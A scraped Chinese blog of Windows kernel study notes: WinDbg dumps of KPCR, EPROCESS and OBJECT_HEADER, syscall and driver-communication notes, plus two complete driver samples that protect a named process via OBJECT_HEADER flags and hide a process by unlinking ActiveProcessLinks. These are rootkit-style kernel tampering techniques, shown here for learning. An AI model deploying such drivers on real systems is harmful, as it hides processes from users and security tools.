在某些情况下会指向TEB-------------------------------------------------------------- +0x000 Used_ExceptionList : Ptr32 _EXCEPTION_REGISTRATION_RECORD // 异常链表 +0x004 Used_StackBase : Ptr32 Void +0x008 Spare2 : Ptr32 Void +0x00c TssCopy : Ptr32 Void +0x010 ContextSwitches : Uint4B +0x014 SetMemberCopy : Uint4B +0x018 Used_Self : Ptr32 Void +0x01c SelfPcr : Ptr32 _KPCR // 一定指向自己（KPCR） +0x020 Prcb : Ptr32 _KPRCB // _KPRCB（CPU控制块拓展块）, 指向0x120 PrcbData: _KPRCB +0x024 Irql : UChar // 和中断相关 +0x028 IRR : Uint4B // 和中断相关, 派发的中断 +0x02c IrrActive : Uint4B // 和中断相关 +0x030 IDR : Uint4B // 和中断相关, 已经派发的中断 +0x034 KdVersionBlock : Ptr32 Void // kd版本 +0x038 IDT : Ptr32 _KIDTENTRY // IDT表 +0x03c GDT : Ptr32 _KGDTENTRY // GDT表 +0x040 TSS : Ptr32 _KTSS +0x044 MajorVersion : Uint2B +0x046 MinorVersion : Uint2B +0x048 SetMember : Uint4B +0x04c StallScaleFactor : Uint4B +0x050 SpareUnused : UChar +0x051 Number : UChar +0x052 Spare0 : UChar +0x053 SecondLevelCacheAssociativity : UChar +0x054 VdmAlert : Uint4B +0x058 KernelReserved : [14] Uint4B +0x090 SecondLevelCacheSize : Uint4B +0x094 HalReserved : [16] Uint4B +0x0d4 InterruptMode : Uint4B +0x0d8 Spare1 : UChar +0x0dc KernelReserved2 : [17] Uint4B +0x120 PrcbData : _KPRCB KiProcessorBlock CPU控制扩展块数组KeNumberProcessors CPU核心数量 dd KiProcessorBlock(80b9c120) &#x3D;&gt; dq 80b98800(80409380&#96;c0004fff) &#x3D;&gt; 80b9c000 + 0x120 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273kd&gt; x nt!*ProcessorBlock*84142fbb nt!KiConfigureProcessorBlock (_KiConfigureProcessorBlock@8)83f89a00 nt!KiProcessorBlock = &lt;no type information&gt;kd&gt; dd KiProcessorBlock83f89a00 80b9c120 00000000 00000000 0000000083f89a10 00000000 00000000 00000000 0000000083f89a20 00000000 00000000 00000000 0000000083f89a30 00000000 00000000 00000000 0000000083f89a40 00000000 00000000 00000000 0000000083f89a50 00000000 00000000 00000000 0000000083f89a60 00000000 00000000 00000000 0000000083f89a70 00000000 00000000 00000000 00000000kd&gt; r gdtrgdtr=80b98800kd&gt; dq 80b98800ReadVirtual: 80b98800 not properly sign extended80b98800 00000000`00000000 00cf9b00`0000ffff80b98810 00cf9300`0000ffff 00cffb00`0000ffff80b98820 00cff300`0000ffff 80008bb9`8c0020ab80b98830 804093b9`c0004fff 0040f300`00000fff80b98840 0000f200`0400ffff 00000000`0000000080b98850 800089b9`ad200067 800089b9`acb0006780b98860 00000000`00000000 00000000`0000000080b98870 800092b9`880003ff 00000000`00000000kd&gt; x nt!*KeNumber*83f89ac8 nt!KeNumberProcessors = &lt;no type information&gt;83f89ac4 nt!KeNumberNodes = &lt;no type information&gt;83f899fb nt!KeNumberProcessorsGroup0 = &lt;no type information&gt;kd&gt; dd KeNumberProcessors83f89ac8 00000001 00000002 00000001 0000000083f89ad8 00000000 00000020 111f0000 0000000683f89ae8 0000a502 77516b38 77516a38 77516aa083f89af8 77516ae8 7750554f 83e7f414 0000000083f89b08 00000191 83e7fa5c 00000000 0000000083f89b18 00000000 00000000 7750554d 7750552483f89b28 00000000 00cdaa56 841ec5b8 841554f483f89b38 83ef468f 00000000 83e7f414 00000000kd&gt; dt _KPCR 80b9c000ntdll!_KPCR +0x000 NtTib : _NT_TIB +0x000 Used_ExceptionList : 0x83f4913c _EXCEPTION_REGISTRATION_RECORD +0x004 Used_StackBase : (null) +0x008 Spare2 : (null) +0x00c TssCopy : 0x80b98c00 Void +0x010 ContextSwitches : 0x3998d +0x014 SetMemberCopy : 1 +0x018 Used_Self : (null) +0x01c SelfPcr : 0x80b9c000 _KPCR +0x020 Prcb : 0x80b9c120 _KPRCB +0x024 Irql : 0x1f &#x27;&#x27; +0x028 IRR : 0 +0x02c IrrActive : 0 +0x030 IDR : 0xffffffff +0x034 KdVersionBlock : 0x83f4cdc0 Void +0x038 IDT : 0x80b98000 _KIDTENTRY +0x03c GDT : 0x80b98800 _KGDTENTRY +0x040 TSS : 0x80b98c00 _KTSS +0x044 MajorVersion : 1 // 版本, 扩展使用 +0x046 MinorVersion : 1 // 版本, 扩展使用 +0x048 SetMember : 1 // 线程切换使用 +0x04c StallScaleFactor : 0xa20 +0x050 SpareUnused : 0 &#x27;&#x27; +0x051 Number : 0 &#x27;&#x27; // 当前核数 +0x052 Spare0 : 0 &#x27;&#x27; +0x053 SecondLevelCacheAssociativity : 0 &#x27;&#x27; +0x054 VdmAlert : 0 +0x058 KernelReserved : [14] 0 +0x090 SecondLevelCacheSize : 0 +0x094 HalReserved : [16] 0x1000000 +0x0d4 InterruptMode : 0 +0x0d8 Spare1 : 0 &#x27;&#x27; +0x0dc KernelReserved2 : [17] 0 +0x120 PrcbData : _KPRCB 进程 Ex: 执行体函数, 进程、线程、链表、对象属性赋值、取值, 加锁相关;Ke: 内核函数, 大部分导出;Ki: 微内核函数, 不导出, 内部自己使用, 进程、线程、CPU调度相关Ps: 执行体函数, 进程、线程相关;Mm: 内存相关函数, 一般导出;Mi: 内存相关函数, Mm函数底层调用Mi, 不导出;Io: 文件、设备相关, 导出;Cc: 文件缓存;Rtl: 导出函数, 一般是运行库、字符串, 执行体函数;Zw: SSDT, 但是Zw不需要修改线程的先前模式;Nt: Zw函数会调用到Nt, 本身Zw函数不实现功能;CM: 注册表相关;hal: 硬件相关函数;Ob: 对象管理器, 句柄、创建内核对象、查询内核对象;Pnp: 电源管理;Psp: 执行体函数, 进程、线程, Ps函数实现复杂功能的时候都是调用Psp; OBJECT_HEADER（对象头结构体） 32位下为0x18, 64位下为0x30; 1234567891011121314kd&gt; dt _OBJECT_HEADERnt!_OBJECT_HEADER +0x000 PointerCount : Int4B // Ob类函数引用次数 +0x004 HandleCount : Int4B // 句柄引用 +0x004 NextToFree : Ptr32 Void +0x008 Lock : _EX_PUSH_LOCK +0x00c TypeIndex : UChar +0x00d TraceFlags : UChar +0x00e InfoMask : UChar +0x00f Flags : UChar // 设置为4保护进程 +0x010 ObjectCreateInfo : Ptr32 _OBJECT_CREATE_INFORMATION +0x010 QuotaBlockCharged : Ptr32 Void +0x014 SecurityDescriptor : Ptr32 Void +0x018 Body : _QUAD EPROCESS（执行体结构）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146kd&gt; dt _EPROCESSntdll!_EPROCESS +0x000 Pcb : _KPROCESS +0x098 ProcessLock : _EX_PUSH_LOCK // 进程锁 +0x0a0 CreateTime : _LARGE_INTEGER // 进程创建时间 +0x0a8 ExitTime : _LARGE_INTEGER // 进程结束时间 +0x0b0 RundownProtect : _EX_RUNDOWN_REF // 进程运行保护锁 +0x0b4 UniqueProcessId : Ptr32 Void // 进程ID +0x0b8 ActiveProcessLinks : _LIST_ENTRY // 活动进程链表 +0x0c0 ProcessQuotaUsage : [2] Uint4B // 统计进程所用内存 +0x0c8 ProcessQuotaPeak : [2] Uint4B +0x0d0 CommitCharge : Uint4B +0x0d4 QuotaBlock : Ptr32 _EPROCESS_QUOTA_BLOCK +0x0d8 CpuQuotaBlock : Ptr32 _PS_CPU_QUOTA_BLOCK +0x0dc PeakVirtualSize : Uint4B +0x0e0 VirtualSize : Uint4B +0x0e4 SessionProcessLinks : _LIST_ENTRY // 针对某个用户的进程链表 +0x0ec DebugPort : Ptr32 Void // 有值代表正在被调式 +0x0f0 ExceptionPortData : Ptr32 Void // 异常 +0x0f0 ExceptionPortValue : Uint4B // 异常 +0x0f0 ExceptionPortState : Pos 0, 3 Bits +0x0f4 ObjectTable : Ptr32 _HANDLE_TABLE // 句柄表 +0x0f8 Token : _EX_FAST_REF // 代表有什么权限 +0x0fc WorkingSetPage : Uint4B // 目前用了多少页 +0x100 AddressCreationLock : _EX_PUSH_LOCK +0x104 RotateInProgress : Ptr32 _ETHREAD +0x108 ForkInProgress : Ptr32 _ETHREAD +0x10c HardwareTrigger : Uint4B +0x110 PhysicalVadRoot : Ptr32 _MM_AVL_TABLE +0x114 CloneRoot : Ptr32 Void +0x118 NumberOfPrivatePages : Uint4B +0x11c NumberOfLockedPages : Uint4B +0x120 Win32Process : Ptr32 Void +0x124 Job : Ptr32 _EJOB +0x128 SectionObject : Ptr32 Void +0x12c SectionBaseAddress : Ptr32 Void +0x130 Cookie : Uint4B +0x134 Spare8 : Uint4B +0x138 WorkingSetWatch : Ptr32 _PAGEFAULT_HISTORY +0x13c Win32WindowStation : Ptr32 Void +0x140 InheritedFromUniqueProcessId : Ptr32 Void +0x144 LdtInformation : Ptr32 Void +0x148 VdmObjects : Ptr32 Void +0x14c ConsoleHostProcess : Uint4B +0x150 DeviceMap : Ptr32 Void +0x154 EtwDataSource : Ptr32 Void +0x158 FreeTebHint : Ptr32 Void +0x160 PageDirectoryPte : Uint8B +0x168 Session : Ptr32 Void +0x16c ImageFileName : [15] UChar // 进程名称 +0x17b PriorityClass : UChar +0x17c JobLinks : _LIST_ENTRY +0x184 LockedPagesList : Ptr32 Void +0x188 ThreadListHead : _LIST_ENTRY // 线程链表 +0x190 SecurityPort : Ptr32 Void +0x194 PaeTop : Ptr32 Void +0x198 ActiveThreads : Uint4B // 当前进程有多少进程 +0x19c ImagePathHash : Uint4B +0x1a0 DefaultHardErrorProcessing : Uint4B +0x1a4 LastThreadExitStatus : Int4B +0x1a8 Peb : Ptr32 _PEB // peb +0x1ac PrefetchTrace : _EX_FAST_REF +0x1b0 ReadOperationCount : _LARGE_INTEGER +0x1b8 WriteOperationCount : _LARGE_INTEGER +0x1c0 OtherOperationCount : _LARGE_INTEGER +0x1c8 ReadTransferCount : _LARGE_INTEGER +0x1d0 WriteTransferCount : _LARGE_INTEGER +0x1d8 OtherTransferCount : _LARGE_INTEGER +0x1e0 CommitChargeLimit : Uint4B +0x1e4 CommitChargePeak : Uint4B +0x1e8 AweInfo : Ptr32 Void +0x1ec SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO // 完整路径 +0x1f0 Vm : _MMSUPPORT +0x25c MmProcessLinks : _LIST_ENTRY +0x264 HighestUserAddress : Ptr32 Void +0x268 ModifiedPageCount : Uint4B +0x26c Flags2 : Uint4B +0x26c JobNotReallyActive : Pos 0, 1 Bit +0x26c AccountingFolded : Pos 1, 1 Bit +0x26c NewProcessReported : Pos 2, 1 Bit +0x26c ExitProcessReported : Pos 3, 1 Bit +0x26c ReportCommitChanges : Pos 4, 1 Bit +0x26c LastReportMemory : Pos 5, 1 Bit +0x26c ReportPhysicalPageChanges : Pos 6, 1 Bit +0x26c HandleTableRundown : Pos 7, 1 Bit +0x26c NeedsHandleRundown : Pos 8, 1 Bit +0x26c RefTraceEnabled : Pos 9, 1 Bit +0x26c NumaAware : Pos 10, 1 Bit +0x26c ProtectedProcess : Pos 11, 1 Bit // 进程保护 +0x26c DefaultPagePriority : Pos 12, 3 Bits +0x26c PrimaryTokenFrozen : Pos 15, 1 Bit +0x26c ProcessVerifierTarget : Pos 16, 1 Bit +0x26c StackRandomizationDisabled : Pos 17, 1 Bit +0x26c AffinityPermanent : Pos 18, 1 Bit +0x26c AffinityUpdateEnable : Pos 19, 1 Bit +0x26c PropagateNode : Pos 20, 1 Bit +0x26c ExplicitAffinity : Pos 21, 1 Bit +0x26c Spare1 : Pos 22, 1 Bit +0x26c ForceRelocateImages : Pos 23, 1 Bit +0x26c DisallowStrippedImages : Pos 24, 1 Bit +0x26c LowVaAccessible : Pos 25, 1 Bit +0x26c RestrictIndirectBranchPrediction : Pos 26, 1 Bit +0x26c AddressPolicyFrozen : Pos 27, 1 Bit +0x26c SpeculativeStoreBypassDisable : Pos 28, 1 Bit +0x270 Flags : Uint4B +0x270 CreateReported : Pos 0, 1 Bit // 创建进程时是否上报 +0x270 NoDebugInherit : Pos 1, 1 Bit +0x270 ProcessExiting : Pos 2, 1 Bit // 进程是否在退出中 +0x270 ProcessDelete : Pos 3, 1 Bit // 进程内存是否全部删除 +0x270 Wow64SplitPages : Pos 4, 1 Bit +0x270 VmDeleted : Pos 5, 1 Bit +0x270 OutswapEnabled : Pos 6, 1 Bit +0x270 Outswapped : Pos 7, 1 Bit +0x270 ForkFailed : Pos 8, 1 Bit +0x270 Wow64VaSpace4Gb : Pos 9, 1 Bit +0x270 AddressSpaceInitialized : Pos 10, 2 Bits +0x270 SetTimerResolution : Pos 12, 1 Bit +0x270 BreakOnTermination : Pos 13, 1 Bit +0x270 DeprioritizeViews : Pos 14, 1 Bit +0x270 WriteWatch : Pos 15, 1 Bit +0x270 ProcessInSession : Pos 16, 1 Bit +0x270 OverrideAddressSpace : Pos 17, 1 Bit +0x270 HasAddressSpace : Pos 18, 1 Bit +0x270 LaunchPrefetched : Pos 19, 1 Bit +0x270 InjectInpageErrors : Pos 20, 1 Bit +0x270 VmTopDown : Pos 21, 1 Bit // 置1代表申请内存时从最后开始申请 +0x270 ImageNotifyDone : Pos 22, 1 Bit +0x270 PdeUpdateNeeded : Pos 23, 1 Bit +0x270 VdmAllowed : Pos 24, 1 Bit +0x270 CrossSessionCreate : Pos 25, 1 Bit +0x270 ProcessInserted : Pos 26, 1 Bit // 设置为0将进程保护起来，打开不了句柄 +0x270 DefaultIoPriority : Pos 27, 3 Bits +0x270 ProcessSelfDelete : Pos 30, 1 Bit +0x270 SetTimerResolutionLink : Pos 31, 1 Bit +0x274 ExitStatus : Int4B // 进程退出状态码（通常创建时为259或0x103） +0x278 VadRoot : _MM_AVL_TABLE +0x298 AlpcContext : _ALPC_PROCESS_CONTEXT +0x2a8 TimerResolutionLink : _LIST_ENTRY +0x2b0 RequestedTimerResolution : Uint4B +0x2b4 ActiveThreadsHighWatermark : Uint4B +0x2b8 SmallestTimerResolution : Uint4B +0x2bc TimerResolutionStackRecord : Ptr32 _PO_DIAG_STACK_RECORD +0x2c0 SequenceNumber : Uint8B +0x2c8 CreateInterruptTime : Uint8B +0x2d0 CreateUnbiasedInterruptTime : Uint8B +0x2d8 SecurityDomain : Uint8B 作业: ActiveProcessLinks 断链 KPROCESS（内核结构）123456789101112131415161718192021222324252627282930313233343536kd&gt; dt _KPROCESSntdll!_KPROCESS +0x000 Header : _DISPATCHER_HEADER +0x010 ProfileListHead : _LIST_ENTRY // 性能分析 +0x018 DirectoryTableBase : Uint4B // 当前进程的cr3 +0x01c LdtDescriptor : _KGDTENTRY +0x024 Int21Descriptor : _KIDTENTRY +0x02c ThreadListHead : _LIST_ENTRY +0x034 ProcessLock : Uint4B +0x038 Affinity : _KAFFINITY_EX // 亲核性 +0x044 ReadyListHead : _LIST_ENTRY // 就绪链表 +0x04c SwapListEntry : _SINGLE_LIST_ENTRY +0x050 ActiveProcessors : _KAFFINITY_EX +0x05c AutoAlignment : Pos 0, 1 Bit // 进程是否是对齐的 +0x05c DisableBoost : Pos 1, 1 Bit // +0x05c DisableQuantum : Pos 2, 1 Bit // 进程关闭线程时间碎片的设置 +0x05c ActiveGroupsMask : Pos 3, 1 Bit // +0x05c ReservedFlags : Pos 4, 28 Bits +0x05c ProcessFlags : Int4B +0x060 BasePriority : Char // 线程继承的优先级 +0x061 QuantumReset : Char // 时间碎片 +0x062 Visited : UChar +0x063 Unused3 : UChar +0x064 ThreadSeed : [1] Uint4B +0x068 IdealNode : [1] Uint2B +0x06a IdealGlobalNode : Uint2B +0x06c Flags : _KEXECUTE_OPTIONS +0x06d AddressPolicy : UChar +0x06e IopmOffset : Uint2B +0x070 Unused4 : Uint4B +0x074 StackCount : _KSTACK_COUNT +0x078 ProcessListEntry : _LIST_ENTRY +0x080 CycleTime : Uint8B +0x088 KernelTime : Uint4B +0x08c UserTime : Uint4B +0x090 VdmTrapcHandler : Ptr32 Void 保护进程 通过将设置OBJECT_HEADER中的Flags为4, 保护进程不被打开; 实验代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899#include &lt;ntifs.h&gt;EXTERN_C UCHAR * PsGetProcessImageFileName(__in PEPROCESS Process);/*#define OB_FLAG_NEW_OBJECT 0x01#define OB_FLAG_KERNEL_OBJECT 0x02#define OB_FLAG_CREATOR_INFO 0x04 // 表示进程刚被创建, 还未创建ObjectCreateInfo，不让打开#define OB_FLAG_EXCLUSIVE_OBJECT 0x08#define OB_FLAG_PERMANENT_OBJECT 0x10#define OB_FLAG_DEFAULT_SECURITY_QUOTA 0x20#define OB_FLAG_SINGLE_HANDLE_ENTRY 0x40#define OB_FLAG_DELETED_INLINE 0x80*/VOID SetProcessFlag(PEPROCESS pEProcess)&#123; PUCHAR pObjectHeader = NULL;#ifdef _WIN64 pObjectHeader = ((PUCHAR)pEProcess - 0x30); *(pObjectHeader + 0x1b) |= 4;#else pObjectHeader = ((PUCHAR)pEProcess - 0x18); *(pObjectHeader + 0x0f) |= 4;#endif // _WIN64&#125;VOID ReSetProcessFlag(PEPROCESS pEProcess)&#123; PUCHAR pObjectHeader = NULL;#ifdef _WIN64 pObjectHeader = ((PUCHAR)pEProcess - 0x30); *(pObjectHeader + 0x1b) &amp;= ~4;#else pObjectHeader = ((PUCHAR)pEProcess - 0x18); *(pObjectHeader + 0x0f) &amp;= ~4;#endif // _WIN64&#125;PEPROCESS FindProcessByName(char * szName)&#123; PEPROCESS pFindEProcess = NULL; for (int i = 4; i &lt; 0x1000000; i+=4) &#123; PEPROCESS pEProcess = NULL; NTSTATUS status = PsLookupProcessByProcessId((HANDLE)i, &amp;pEProcess); if (!NT_SUCCESS(status)) &#123; continue; &#125; // PsGetProcessImageFileName函数返回的名称有长度限制（15个字节） PUCHAR pszProcessName = PsGetProcessImageFileName(pEProcess); DbgPrintEx(77, 0, &quot;[+] FindProcessByName: %s\\r\\n&quot;, pszProcessName); if (pszProcessName &amp;&amp; _stricmp(szName, pszProcessName) == 0) &#123; pFindEProcess = pEProcess; break; &#125; // 引用计数减一 ObDereferenceObject(pEProcess); &#125; return pFindEProcess;&#125;VOID DriverUnload(PDRIVER_OBJECT pDriver)&#123; DbgPrintEx(77, 0, &quot;-------------DriverUnload-------------&quot;); PEPROCESS pEProcess = FindProcessByName(&quot;Dbgview.exe&quot;); if (!pEProcess) &#123; return; &#125; ReSetProcessFlag(pEProcess); ObDereferenceObject(pEProcess);&#125;NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)&#123; DbgPrintEx(77, 0, &quot;-------------DriverEntry-------------&quot;); PEPROCESS pEProcess = FindProcessByName(&quot;Dbgview.exe&quot;); if (!pEProcess) &#123; return STATUS_UNSUCCESSFUL; &#125; DbgPrintEx(77, 0, &quot;FindProcessByName Done.&quot;); SetProcessFlag(pEProcess); // PsLookupProcessByProcessId((HANDLE)3824, &amp;pEProcess); // 32位：0x18 // 64位：0x30 /*PUCHAR pObjectHeader = ((PUCHAR)pEProcess + 0x18); *(pObjectHeader + 0xf) |= 4;*/ ObDereferenceObject(pEProcess); pDriver-&gt;DriverUnload = DriverUnload; return STATUS_SUCCESS;&#125; 进程断链（ActiveProcessLinks）获取ActiveProcessLinks偏移 在内核文件中存在PsGetProcessId函数, 代码中存在eax+0B4h（代表EPROCESS中0x0b4 UniqueProcessId进程ID）, 通过此处再加4得到ActiveProcessLinks偏移; 1234567891011121314.text:004B87D6 ; HANDLE __stdcall PsGetProcessId(PEPROCESS Process).text:004B87D6 public _PsGetProcessId@4.text:004B87D6 _PsGetProcessId@4 proc near ; CODE XREF: EtwpNotifyGuid(x,x)+13E↓p.text:004B87D6.text:004B87D6 Process = dword ptr 8.text:004B87D6.text:004B87D6 mov edi, edi.text:004B87D8 push ebp.text:004B87D9 mov ebp, esp.text:004B87DB mov eax, [ebp+Process].text:004B87DE mov eax, [eax+0B4h].text:004B87E4 pop ebp.text:004B87E5 retn 4.text:004B87E5 _PsGetProcessId@4 endp 实验代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#include &lt;ntifs.h&gt;// FindProcessByName 暴力枚举进程PEPROCESS FindProcessByName(PWCH wcProcessName)&#123; PEPROCESS pEProcess = NULL; PEPROCESS pFindEProcess = NULL; for (int i = 8; i &lt; 0x10000000; i+=4) &#123; NTSTATUS status = PsLookupProcessByProcessId((HANDLE)i, &amp;pEProcess); if (!NT_SUCCESS(status)) &#123; continue; &#125; PUNICODE_STRING usProcessName = NULL; // SeLocateProcessImageName 获取进程全路径, PsGetProcessImageFileName函数获取的进程名称只有15字节, 进程名称过长会导致截断, 无法正确判断 status = SeLocateProcessImageName(pEProcess, &amp;usProcessName); if (!NT_SUCCESS(status)) &#123; ObDereferenceObject(pEProcess); continue; &#125; if (usProcessName-&gt;Length) &#123; _wcsupr(usProcessName-&gt;Buffer); if (wcsstr(usProcessName-&gt;Buffer, wcProcessName) != 0) &#123; pFindEProcess = pEProcess; // ExFreePoolWithTag 释放内存 ExFreePoolWithTag(usProcessName, 0); break; &#125; &#125; ExFreePoolWithTag(usProcessName, 0); ObDereferenceObject(pEProcess); &#125; return pFindEProcess;&#125;// GetActiveProcessLinksOffset 获取ActiveProcessLinks偏移ULONG GetActiveProcessLinksOffset()&#123; static ULONG offset = 0; if (offset) return offset; UNICODE_STRING usFuncName; RtlInitUnicodeString(&amp;usFuncName, L&quot;PsGetProcessId&quot;); PUCHAR pFunc = (PUCHAR)MmGetSystemRoutineAddress(&amp;usFuncName); for (int i = 0; i &lt; 100; i++) &#123; if (pFunc[i] == 0x8b &amp;&amp; pFunc[i+1] == 0x80) &#123; offset = *(PUCHAR)(pFunc + i + 2); offset += 4; break; &#125; &#125; return offset;&#125;VOID DriverUnload(PDRIVER_OBJECT pDriver)&#123; DbgPrintEx(77, 0, &quot;[db]: DriverUnload Running.&quot;);&#125;NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)&#123; DbgPrintEx(77, 0, &quot;[db]: DriverEntry Running.&quot;); PEPROCESS pEProcess = FindProcessByName(L&quot;DBGVIEW.EXE&quot;); DbgPrintEx(77, 0, &quot;[db]: FindProcessByName Done.&quot;); // 断链 ULONG offset = GetActiveProcessLinksOffset(); DbgPrintEx(77, 0, &quot;[db]: GetActiveProcessLinksOffset Done.&quot;); RemoveEntryList((PUCHAR)pEProcess + offset); // 初始化进程链表（防止退出进程后随机出现蓝屏） InitializeListHead((PUCHAR)pEProcess + offset); ObDereferenceObject(pEProcess); pDriver-&gt;DriverUnload = DriverUnload; return STATUS_SUCCESS;&#125;","categories":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/categories/Windows%E5%86%85%E6%A0%B8/"}],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Windows内核-系统调用","slug":"Windows内核-系统调用","date":"2024-11-12T01:41:52.000Z","updated":"2024-11-15T01:43:39.962Z","comments":true,"path":"930cd1ef.html","link":"","permalink":"http://example.com/930cd1ef.html","excerpt":"系统调用","text":"系统调用 系统调用知识点自己实现NtOpenProcess在Ring3的代码下调用了sysenter指令之后, CPU会做出如下操作 将SYSENTER_CS_MSR的值装载到cs寄存器; &#x2F;&#x2F; rdmsr 174 将SYSENTER_EIP_MSR的值装载到eip寄存器; &#x2F;&#x2F; rdmsr 176 将SYSENTER_CS_MSR的值加8（Ring0的堆栈段描述符）装载到ss寄存器; 将SYSENTER_ESP_MSR的值装载到esp寄存器; &#x2F;&#x2F; rdmsr 175 将特权级别切换到Ring0; 如果EFLAGS寄存器的VM标志被置位, 则清除该标志; 开始执行指定的Ring0代码; 在Ring0代码执行完毕, 调用SYEXIT指令退回Ring3时, CPU会做出如下操作 将SYSENTER_CS_MSR的值加16（Ring3的代码段描述符）装载到cs寄存器; 将寄存器edx的值装载到eip寄存器; 将SYSENTER_CS_MSR的值加24（Ring3的堆栈段描述符）装载到ss寄存器; 将寄存器ecx的值装载到esp寄存器; 将特权等级切换到Ring3; 继续执行Ring3的代码 rdmsr用法 读取msr寄存器 12345678__asm&#123; mov ecx, 0x174; rdmsr;&#125;// 返回值存在ecx和edx寄存器中// eax: 低32位// edx: 高32位 写入msr寄存器 1234567__asm&#123; mov eax, 0x12345678; mov edx, 0; mov ecx, 176h; wrmsr;&#125; _KTRAP_FRAME 内核下的CONTEXT SSDT Hook","categories":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/categories/Windows%E5%86%85%E6%A0%B8/"}],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Windows内核-驱动内存加载","slug":"Windows内核-驱动内存加载","date":"2024-11-03T01:21:39.000Z","updated":"2024-11-10T02:59:43.557Z","comments":true,"path":"87f76606.html","link":"","permalink":"http://example.com/87f76606.html","excerpt":"驱动内存加载","text":"驱动内存加载 驱动内存加载知识点步骤 通过explore.exe定位到文件 使用CreateProcess创建进程（CreateUserProcess） a. 创建进程开辟一块内存 PEB 内核下需要挂C0000000 b. 通过文件路径载入exe c. 拉伸PE, 解析PE头, 把对应的数据目录存放到内存相关偏移的地址 d. 修复重定位 e. IAT 导入表修复 f. 修复TLS（驱动没有） g. 修复延迟导入表（驱动没有, 驱动存在Cookie） h. 修复异常表 i. CALL入口点","categories":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/categories/Windows%E5%86%85%E6%A0%B8/"}],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Windows内核-驱动通信","slug":"Windows内核-驱动通信","date":"2024-11-01T01:24:38.000Z","updated":"2024-11-03T01:26:52.746Z","comments":true,"path":"6195666c.html","link":"","permalink":"http://example.com/6195666c.html","excerpt":"驱动通信驱动通信","text":"驱动通信驱动通信 驱动通信知识点DRIVER_OBJECT123456789101112131415161718192021222324252627kd&gt; dt _DEVICE_OBJECTntdll!_DEVICE_OBJECT +0x000 Type : Int2B // 设备大小 +0x002 Size : Uint2B +0x004 ReferenceCount : Int4B +0x008 DriverObject : Ptr32 _DRIVER_OBJECT +0x00c NextDevice : Ptr32 _DEVICE_OBJECT +0x010 AttachedDevice : Ptr32 _DEVICE_OBJECT +0x014 CurrentIrp : Ptr32 _IRP // 当前请求IRP +0x018 Timer : Ptr32 _IO_TIMER // 时钟 +0x01c Flags : Uint4B // 以什么方式读写设备 +0x020 Characteristics : Uint4B // 设置属性 +0x024 Vpb : Ptr32 _VPB // 磁盘相关, 暂不涉及 +0x028 DeviceExtension : Ptr32 Void // 扩展 +0x02c DeviceType : Uint4B // 设备类型 +0x030 StackSize : Char // 设备栈的大小 +0x034 Queue : &lt;unnamed-tag&gt; // 队列 +0x05c AlignmentRequirement : Uint4B +0x060 DeviceQueue : _KDEVICE_QUEUE +0x074 Dpc : _KDPC +0x094 ActiveThreadCount : Uint4B +0x098 SecurityDescriptor : Ptr32 Void +0x09c DeviceLock : _KEVENT +0x0ac SectorSize : Uint2B +0x0ae Spare1 : Uint2B +0x0b0 DeviceObjectExtension : Ptr32 _DEVOBJ_EXTENSION +0x0b4 Reserved : Ptr32 Void IRP1234567891011121314151617181920212223kd&gt; dt _IRPntdll!_IRP +0x000 Type : Int2B +0x002 Size : Uint2B +0x004 MdlAddress : Ptr32 _MDL +0x008 Flags : Uint4B +0x00c AssociatedIrp : &lt;unnamed-tag&gt; +0x010 ThreadListEntry : _LIST_ENTRY +0x018 IoStatus : _IO_STATUS_BLOCK +0x020 RequestorMode : Char +0x021 PendingReturned : UChar +0x022 StackCount : Char // 总大小（有多少设备） +0x023 CurrentLocation : Char // 当前设备栈的索引 +0x024 Cancel : UChar +0x025 CancelIrql : UChar +0x026 ApcEnvironment : Char +0x027 AllocationFlags : UChar +0x028 UserIosb : Ptr32 _IO_STATUS_BLOCK +0x02c UserEvent : Ptr32 _KEVENT +0x030 Overlay : &lt;unnamed-tag&gt; +0x038 CancelRoutine : Ptr32 void +0x03c UserBuffer : Ptr32 Void +0x040 Tail : &lt;unnamed-tag&gt; 创建设备12345678910111213141516NTSTATUSIoCreateDevice( _In_ PDRIVER_OBJECT DriverObject, // 要提供的驱动对象 _In_ ULONG DeviceExtensionSize, // 设备扩展, 0代表这个地方没有指向 _In_opt_ PUNICODE_STRING DeviceName, // 设备名称 _In_ DEVICE_TYPE DeviceType, // 设备类型 _In_ ULONG DeviceCharacteristics, // 设备属性 _In_ BOOLEAN Exclusive, // 是否独占 _Outptr_result_nullonfailure_ _At_(*DeviceObject, __drv_allocatesMem(Mem) _When_((((_In_function_class_(DRIVER_INITIALIZE)) ||(_In_function_class_(DRIVER_DISPATCH)))), __drv_aliasesMem)) PDEVICE_OBJECT *DeviceObject // 创建成功后返回的驱动对象 ); 自定义控制码12345678910#define CTL_CODE( DeviceType, Function, Method, Access ) ( \\ ((DeviceType) &lt;&lt; 16) | ((Access) &lt;&lt; 14) | ((Function) &lt;&lt; 2) | (Method) \\)#define INIT_KEY CTL_CODE(FILE_DEVICE_UNKNOWN, CODE_CTR_INDEX, METHOD_BUFFERED, FILE_ANY_ACCESS) // 虚拟设备类型 // 索引号 // 通信方式 // 访问权限#define READ_MEMORY CTL_CODE(FILE_DEVICE_UNKNOWN, CODE_CTR_INDEX+1, METHOD_BUFFERED, FILE_ANY_ANY_ACCESS)#define WRITE_MEMORY 